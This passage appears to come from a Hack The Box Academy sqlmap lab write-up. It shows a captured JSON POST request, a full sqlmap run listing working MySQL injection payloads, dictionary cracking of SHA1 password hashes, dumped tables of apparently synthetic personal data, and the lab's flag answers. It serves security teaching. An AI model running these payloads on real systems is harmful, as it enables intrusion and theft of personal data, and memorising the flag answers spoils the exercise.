[21:37:19] [INFO] cracked password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'                                            
[21:37:19] [INFO] cracked password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'                                            
[21:37:19] [INFO] cracked password 'rohaniah' for hash '4bf1926f7bb7ae283e1390236fd4a8737209862e'                                            
[21:37:19] [INFO] cracked password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'                                            
[21:37:19] [INFO] cracked password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'                                          
Database: testdb                                                                                                                             
Table: users
[32 entries]
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | email                       | phone        | name              | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | MaynardMRice@yahoo.com      | 281-559-0172 | Maynard Rice      | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | JulioWThomas@gmail.com      | 973-426-5961 | Julio Thomas      | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219                    | Agricultural product sorter                       |
| 3  | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | GregoryBStumbaugh@yahoo.com | 410-680-5653 | Gregory Stumbaugh | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | BobbyJGranger@gmail.com     | 212-696-1812 | Bobby Granger     | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | DeanLHarper@yahoo.com       | 440-847-8376 | Dean Harper       | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | GabrielaRWaite@msn.com      | 732-638-1529 | Gabriela Waite    | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
| 9  | 5452466713512742 | RoySCarr@msn.com            | 408-848-6272 | Roy Carr          | 1384 Sycamore Street   | October 19 1942   | 9987f0c165bc62eb3ee3db17967fbb81c026c197 (tarablinda)       | Freight, stock, and material mover                |
| 10 | 5231550277906388 | AlfonzoGWilliams@gmail.com  | 740-546-1581 | Alfonzo Williams  | 911 Irving Road        | July 16 1931      | c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b (homerhound)       | Outside order clerk                               |
| 11 | 5224197138746170 | ChristopherHBrown@yahoo.com | 917-840-2535 | Christopher Brown | 2246 Settlers Lane     | March 29 1951     | 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb (millisa34)        | Unlicensed assistive personnel                    |
| 12 | 4485150912665782 | AudreyRHill@gmail.com       | 717-308-3644 | Audrey Hill       | 2306 Stout Street      | July 19 1969      | 8203b1bf12aba49d7566ff7007b60d1c0a439bee (morswin2)         | Mail processor                                    |
| 13 | 4716071391111521 | RyanMSpencer@msn.com        | 256-441-1530 | Ryan Spencer      | 4309 Turnpike Drive    | July 3 1979       | ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 (breakout)         | Claims representative                             |
| 14 | 4716242999773281 | JessieJSchwan@yahoo.com     | 989-217-2111 | Jessie Schwan     | 1285 Wood Street       | October 28 1937   | 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b (actionteam)       | Network and computer systems administrator        |
| 15 | 5183997232057997 | ShannonRStewart@yahoo.com   | 828-850-2133 | Shannon Stewart   | 1596 Watson Lane       | May 28 1934       | 2e0488a09433aa0d67b3463c76f407c7b0388ad7 (nike92)           | Sketch artist                                     |
| 16 | 4556164708532886 | MarkLStilwell@msn.com       | 715-392-4649 | Mark Stilwell     | 121 Abner Road         | September 1 1950  | 21549a28300f72442b132d06d4016de606f36627 (vptwo0gc)         | Occupational therapist assistant                  |
| 17 | 4485731897297327 | AnnetteDGill@yahoo.com      | 216-376-3062 | Annette Gill      | 4999 Glenwood Avenue   | August 19 1977    | 0ff476c2676a2e5f172fe568110552f2e910c917 (Zc1uowqg6)        | Plate finisher                                    |
| 18 | 4485934311754598 | CyndiBReyes@gmail.com       | 903-679-2061 | Cyndi Reyes       | 4347 Hall Place        | June 5 1947       | 15ce1871a907e8265f00defa21a723e7a4d35267 (plasid)           | Executive                                         |
| 19 | 5217064909950341 | WilliamDMunoz@gmail.com     | 323-789-6686 | William Munoz     | 2961 Hillhaven Drive   | July 4 1928       | df692aa944eb45737f0b3b3ef906f8372a3834e9 (1201Hunt)         | Service station attendant                         |
| 20 | 4929461176669103 | ScottBPonce@yahoo.com       | 626-537-0602 | Scott Ponce       | 3023 Woodstock Drive   | September 19 1947 | 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c (donatus)          | Benefits manager                                  |
| 21 | 4916977560623393 | PhilipTAhearn@gmail.com     | 509-327-6685 | Philip Ahearn     | 4418 Goodwin Avenue    | May 22 1938       | 3d8f48ab8e119dd813a449f6bfcf42abae63567b (sk8ter58)         | Office assistant                                  |
| 22 | 5480619405065199 | MyraJStephenson@yahoo.com   | 717-770-6897 | Myra Stephenson   | 4225 Aaron Smith Drive | December 25 1966  | 41244ab550c182b3ebe2dce87065bf363d0e013e (sgreen4eva)       | Animator                                          |
| 23 | 4532761682899246 | MarianCJoiner@yahoo.com     | 707-467-5061 | Marian Joiner     | 273 Fairway Drive      | February 12 1978  | 5635e59941510dc473fbeed046c43007f76cfe03 (melek200215)      | Foundry mold and coremaker                        |
| 24 | 5357620822740711 | LloydSLiu@gmail.com         | 616-396-4287 | Lloyd Liu         | 3277 Howard Street     | August 18 1951    | 09422b94c8f031285b22500c2d0a68bb8ec4dc70                    | Sound engineering technician                      |
| 25 | 5219707450752213 | JoshuaEFletcher@gmail.com   | 317-670-8864 | Joshua Fletcher   | 1510 Stewart Street    | August 14 1934    | 65b136cb1ec4b88f709f8f510262720eddfa71a7 (mike230040)       | Edition binding worker                            |
| 26 | 4485684355495794 | MargaretNBooker@msn.com     | 760-969-7147 | Margaret Booker   | 70 Wilson Street       | December 17 1975  | 4282cfe7697817374251bc17aa47de6f620586b5 (hjungpil1)        | Management information systems director           |
| 27 | 5134210174158363 | FrancisMArroyo@yahoo.com    | 951-252-9692 | Francis Arroyo    | 3600 Hillcrest Lane    | July 6 1993       | f2d897eb3bae0f1fd396325deb3c4779ae1d586d (ford1900)         | Gastroenterology nurse                            |
| 28 | 4485114901308234 | AngelJMarquez@gmail.com     | 209-874-4743 | Angel Marquez     | 1144 Richards Avenue   | May 14 1966       | 4bf1926f7bb7ae283e1390236fd4a8737209862e (rohaniah)         | Echocardiographer                                 |
| 29 | 4532210842993911 | PamelaJRock@yahoo.com       | 715-454-8565 | Pamela Rock       | 3110 Abner Road        | October 31 1992   | c7fbcdaf308cdcd64504d46342e7c79959388c44 (exquisite)        | Private investigator                              |
| 30 | 4556109704569770 | DennisDSnow@yahoo.com       | 715-730-1951 | Dennis Snow       | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          | Unlicensed assistive personnel                    |
| 31 | 5554945940459873 | LorenSBunch@gmail.com       | 805-766-2963 | Loren Bunch       | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         | Cafeteria cook                                    |
| 32 | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818                    | General and operations manager                    |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+

[21:37:21] [INFO] table 'testdb.users' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/users.csv'
[21:37:21] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[21:37:21] [WARNING] your sqlmap version is outdated

[*] ending @ 21:37:21 /2026-09-08/
```

**Answer:** `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`

---

### 3. What's the contents of table flag4? (Case #4)

Context:
- Capture the request and get the HTTP request
```bash
POST /case4.php HTTP/1.1
Host: 154.57.164.82:30883
Content-Length: 8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://154.57.164.82:30883
Referer: http://154.57.164.82:30883/case4.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"id":1}
```
- Exploit with SQLMap:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ vim req3.txt
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req3.txt --batch --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:39:03 /2026-09-08/

[21:39:03] [INFO] parsing HTTP request from 'req3.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[21:39:03] [INFO] testing connection to the target URL
[21:39:03] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:39:03] [INFO] testing if the target URL content is stable
[21:39:03] [INFO] target URL content is stable
[21:39:03] [INFO] testing if (custom) POST parameter 'JSON id' is dynamic
[21:39:04] [INFO] (custom) POST parameter 'JSON id' appears to be dynamic
[21:39:04] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON id' might be injectable (possible DBMS: 'MySQL')
[21:39:04] [INFO] heuristic (XSS) test shows that (custom) POST parameter 'JSON id' might be vulnerable to cross-site scripting (XSS) attacks
[21:39:04] [INFO] testing for SQL injection on (custom) POST parameter 'JSON id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[21:39:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:39:04] [WARNING] reflective value(s) found and filtering out
[21:39:05] [INFO] (custom) POST parameter 'JSON id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="id")
[21:39:05] [INFO] testing 'Generic inline queries'
[21:39:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:39:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:39:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:39:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:39:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:39:07] [WARNING] potential permission problems detected ('command denied')
[21:39:07] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:39:07] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:39:07] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:39:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:39:08] [INFO] (custom) POST parameter 'JSON id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[21:39:08] [INFO] testing 'MySQL inline queries'
[21:39:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:39:08] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                  
[21:39:22] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[21:39:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:39:32] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:39:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:39:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:39:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:39:34] [INFO] target URL appears to have 6 columns in query
[21:39:34] [INFO] (custom) POST parameter 'JSON id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"1 AND 8138=8138"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"id":"1 AND (SELECT 3034 FROM(SELECT COUNT(*),CONCAT(0x7176787071,(SELECT (ELT(3034=3034,1))),0x7170786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: {"id":"1;SELECT SLEEP(5)#"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 7050 FROM (SELECT(SLEEP(5)))Nzrf)"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: {"id":"1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176787071,0x70794c61746946666e624c48686573424f6678517757656146426b637067684d624f6c5a70665161,0x7170786271),NULL-- -"}
---
[21:39:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:39:35] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[21:39:35] [INFO] fetching current database
[21:39:35] [INFO] fetching tables for database: 'testdb'
[21:39:35] [INFO] fetching columns for table 'users' in database 'testdb'
[21:39:36] [INFO] fetching entries for table 'users' in database 'testdb'
[21:39:36] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:39:36] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:39:36] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:39:36] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[21:39:36] [INFO] starting 4 processes 
[21:39:36] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                            
[21:39:37] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                            
[21:39:37] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'                                            
[21:39:37] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'                                                
[21:39:37] [INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'                                         
[21:39:37] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                           
[21:39:37] [INFO] cracked password 'aza221p' for hash '6725c7bee76ccdb7eda15fa263908988115498a9'                                             
[21:39:37] [INFO] cracked password 'actionteam' for hash '520df62660b18e571c7cb3b5d3f559b8a8ff0d4b'                                          
[21:39:37] [INFO] cracked password 'breakout' for hash 'ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74'                                            
[21:39:37] [INFO] cracked password 'donatus' for hash '20021ffbd3be7a3cddc64812d5dd6e5afb6e760c'                                             
[21:39:38] [INFO] cracked password 'exquisite' for hash 'c7fbcdaf308cdcd64504d46342e7c79959388c44'                                           
[21:39:38] [INFO] cracked password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'                                            
[21:39:38] [INFO] cracked password 'hjungpil1' for hash '4282cfe7697817374251bc17aa47de6f620586b5'                                           
[21:39:38] [INFO] cracked password 'homerhound' for hash 'c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b'                                          
[21:39:38] [INFO] cracked password 'mike230040' for hash '65b136cb1ec4b88f709f8f510262720eddfa71a7'                                          
[21:39:38] [INFO] cracked password 'nike92' for hash '2e0488a09433aa0d67b3463c76f407c7b0388ad7'                                              
[21:39:38] [INFO] cracked password 'melek200215' for hash '5635e59941510dc473fbeed046c43007f76cfe03'                                         
[21:39:38] [INFO] cracked password 'millisa34' for hash '608e6d07cc8ce20bfdaf9c72ef420ad691de32cb'                                           
[21:39:38] [INFO] cracked password 'morswin2' for hash '8203b1bf12aba49d7566ff7007b60d1c0a439bee'                                            
[21:39:38] [INFO] cracked password 'rohaniah' for hash '4bf1926f7bb7ae283e1390236fd4a8737209862e'                                            
[21:39:38] [INFO] cracked password 'ford1900' for hash 'f2d897eb3bae0f1fd396325deb3c4779ae1d586d'                                            
[21:39:39] [INFO] cracked password 'plasid' for hash '15ce1871a907e8265f00defa21a723e7a4d35267'                                              
[21:39:39] [INFO] cracked password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'                                          
[21:39:39] [INFO] cracked password 'raided' for hash '2b89b43b038182f67a8b960611d73e839002fbd9'                                              
[21:39:39] [INFO] cracked password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'                                            
[21:39:39] [INFO] cracked password 'sgreen4eva' for hash '41244ab550c182b3ebe2dce87065bf363d0e013e'                                          
[21:39:39] [INFO] cracked password 'spiderpig8574376' for hash 'b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e'                                    
[21:39:39] [INFO] cracked password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'                                            
[21:39:39] [INFO] cracked password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'                                            
Database: testdb                                                                                                                             
Table: users
[32 entries]
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | email                       | phone        | name              | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | MaynardMRice@yahoo.com      | 281-559-0172 | Maynard Rice      | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | JulioWThomas@gmail.com      | 973-426-5961 | Julio Thomas      | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219                    | Agricultural product sorter                       |
| 3  | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | GregoryBStumbaugh@yahoo.com | 410-680-5653 | Gregory Stumbaugh | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | BobbyJGranger@gmail.com     | 212-696-1812 | Bobby Granger     | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | DeanLHarper@yahoo.com       | 440-847-8376 | Dean Harper       | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | GabrielaRWaite@msn.com      | 732-638-1529 | Gabriela Waite    | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
| 9  | 5452466713512742 | RoySCarr@msn.com            | 408-848-6272 | Roy Carr          | 1384 Sycamore Street   | October 19 1942   | 9987f0c165bc62eb3ee3db17967fbb81c026c197 (tarablinda)       | Freight, stock, and material mover                |
| 10 | 5231550277906388 | AlfonzoGWilliams@gmail.com  | 740-546-1581 | Alfonzo Williams  | 911 Irving Road        | July 16 1931      | c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b (homerhound)       | Outside order clerk                               |
| 11 | 5224197138746170 | ChristopherHBrown@yahoo.com | 917-840-2535 | Christopher Brown | 2246 Settlers Lane     | March 29 1951     | 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb (millisa34)        | Unlicensed assistive personnel                    |
| 12 | 4485150912665782 | AudreyRHill@gmail.com       | 717-308-3644 | Audrey Hill       | 2306 Stout Street      | July 19 1969      | 8203b1bf12aba49d7566ff7007b60d1c0a439bee (morswin2)         | Mail processor                                    |
| 13 | 4716071391111521 | RyanMSpencer@msn.com        | 256-441-1530 | Ryan Spencer      | 4309 Turnpike Drive    | July 3 1979       | ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 (breakout)         | Claims representative                             |
| 14 | 4716242999773281 | JessieJSchwan@yahoo.com     | 989-217-2111 | Jessie Schwan     | 1285 Wood Street       | October 28 1937   | 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b (actionteam)       | Network and computer systems administrator        |
| 15 | 5183997232057997 | ShannonRStewart@yahoo.com   | 828-850-2133 | Shannon Stewart   | 1596 Watson Lane       | May 28 1934       | 2e0488a09433aa0d67b3463c76f407c7b0388ad7 (nike92)           | Sketch artist                                     |
| 16 | 4556164708532886 | MarkLStilwell@msn.com       | 715-392-4649 | Mark Stilwell     | 121 Abner Road         | September 1 1950  | 21549a28300f72442b132d06d4016de606f36627 (vptwo0gc)         | Occupational therapist assistant                  |
| 17 | 4485731897297327 | AnnetteDGill@yahoo.com      | 216-376-3062 | Annette Gill      | 4999 Glenwood Avenue   | August 19 1977    | 0ff476c2676a2e5f172fe568110552f2e910c917 (Zc1uowqg6)        | Plate finisher                                    |
| 18 | 4485934311754598 | CyndiBReyes@gmail.com       | 903-679-2061 | Cyndi Reyes       | 4347 Hall Place        | June 5 1947       | 15ce1871a907e8265f00defa21a723e7a4d35267 (plasid)           | Executive                                         |
| 19 | 5217064909950341 | WilliamDMunoz@gmail.com     | 323-789-6686 | William Munoz     | 2961 Hillhaven Drive   | July 4 1928       | df692aa944eb45737f0b3b3ef906f8372a3834e9 (1201Hunt)         | Service station attendant                         |
| 20 | 4929461176669103 | ScottBPonce@yahoo.com       | 626-537-0602 | Scott Ponce       | 3023 Woodstock Drive   | September 19 1947 | 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c (donatus)          | Benefits manager                                  |
| 21 | 4916977560623393 | PhilipTAhearn@gmail.com     | 509-327-6685 | Philip Ahearn     | 4418 Goodwin Avenue    | May 22 1938       | 3d8f48ab8e119dd813a449f6bfcf42abae63567b (sk8ter58)         | Office assistant                                  |
| 22 | 5480619405065199 | MyraJStephenson@yahoo.com   | 717-770-6897 | Myra Stephenson   | 4225 Aaron Smith Drive | December 25 1966  | 41244ab550c182b3ebe2dce87065bf363d0e013e (sgreen4eva)       | Animator                                          |
| 23 | 4532761682899246 | MarianCJoiner@yahoo.com     | 707-467-5061 | Marian Joiner     | 273 Fairway Drive      | February 12 1978  | 5635e59941510dc473fbeed046c43007f76cfe03 (melek200215)      | Foundry mold and coremaker                        |
| 24 | 5357620822740711 | LloydSLiu@gmail.com         | 616-396-4287 | Lloyd Liu         | 3277 Howard Street     | August 18 1951    | 09422b94c8f031285b22500c2d0a68bb8ec4dc70                    | Sound engineering technician                      |
| 25 | 5219707450752213 | JoshuaEFletcher@gmail.com   | 317-670-8864 | Joshua Fletcher   | 1510 Stewart Street    | August 14 1934    | 65b136cb1ec4b88f709f8f510262720eddfa71a7 (mike230040)       | Edition binding worker                            |
| 26 | 4485684355495794 | MargaretNBooker@msn.com     | 760-969-7147 | Margaret Booker   | 70 Wilson Street       | December 17 1975  | 4282cfe7697817374251bc17aa47de6f620586b5 (hjungpil1)        | Management information systems director           |
| 27 | 5134210174158363 | FrancisMArroyo@yahoo.com    | 951-252-9692 | Francis Arroyo    | 3600 Hillcrest Lane    | July 6 1993       | f2d897eb3bae0f1fd396325deb3c4779ae1d586d (ford1900)         | Gastroenterology nurse                            |
| 28 | 4485114901308234 | AngelJMarquez@gmail.com     | 209-874-4743 | Angel Marquez     | 1144 Richards Avenue   | May 14 1966       | 4bf1926f7bb7ae283e1390236fd4a8737209862e (rohaniah)         | Echocardiographer                                 |
| 29 | 4532210842993911 | PamelaJRock@yahoo.com       | 715-454-8565 | Pamela Rock       | 3110 Abner Road        | October 31 1992   | c7fbcdaf308cdcd64504d46342e7c79959388c44 (exquisite)        | Private investigator                              |
| 30 | 4556109704569770 | DennisDSnow@yahoo.com       | 715-730-1951 | Dennis Snow       | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          | Unlicensed assistive personnel                    |
| 31 | 5554945940459873 | LorenSBunch@gmail.com       | 805-766-2963 | Loren Bunch       | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         | Cafeteria cook                                    |
| 32 | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818                    | General and operations manager                    |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+

[21:39:40] [INFO] table 'testdb.users' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/users.csv'
[21:39:40] [INFO] fetching columns for table 'flag4' in database 'testdb'
[21:39:41] [INFO] fetching entries for table 'flag4' in database 'testdb'
Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

[21:39:41] [INFO] table 'testdb.flag4' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag4.csv'
[21:39:41] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[21:39:41] [WARNING] your sqlmap version is outdated

[*] ending @ 21:39:41 /2026-09-08/

```

**Answer:** `HTB{j450n_v00rh335_53nd5_6r475}`

---

[Back to Module Index](./README.md)
